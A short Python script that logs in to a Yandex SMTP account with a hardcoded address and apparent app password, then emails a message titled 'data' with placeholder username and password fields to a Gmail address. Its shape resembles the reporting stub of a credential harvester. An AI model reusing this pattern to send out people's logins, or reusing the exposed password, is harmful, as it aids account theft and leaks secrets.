import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def send_mail():
    sender_email = "veilmsg@yandex.com"
    password = "suewpzvttlkjgjax"
    recipient_email = 'eeshwaryadav7093@gmail.com'

    # Create the message
    message = MIMEMultipart("alternative")
    message["Subject"] = "data"
    message["From"] = sender_email
    message["To"] = recipient_email

    # Create the plain text and HTML parts
    text = """
    username : 123 
    password : 123
    """

    part1 = MIMEText(text, "plain")
    message.attach(part1)

    # Send the email
    try:
        with smtplib.SMTP_SSL("smtp.yandex.com", 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, recipient_email, message.as_string())
        print("Email sent successfully!") 
    except Exception as e:
        print("Error sending email:", e)
        return 1
    
    return 0
